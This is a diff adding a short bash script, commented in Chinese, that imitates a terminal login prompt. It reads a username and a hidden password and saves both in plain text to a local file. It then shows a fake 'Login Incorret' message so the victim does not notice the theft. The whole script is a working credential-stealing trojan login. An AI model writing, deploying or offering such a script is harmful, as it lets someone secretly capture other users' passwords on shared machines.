@@ -1,0 +1,17 @@
+#!/bin/bash
+echo -n "Login: "      # -n不要在最后自动换行
+read name
+stty -echo             #设置命令不被显示
+
+echo -n "Passwd: "      # -n不要在最后自动换行
+read passwd
+
+stty echo
+
+echo $name $passwd >/home/yangni/taocode/qicheng_code/shell/aaa
+sleep 5
+echo "Login Incorret,enter,please"
+stty cooked            #结束，恢复原始终端输入模式
+
+
+
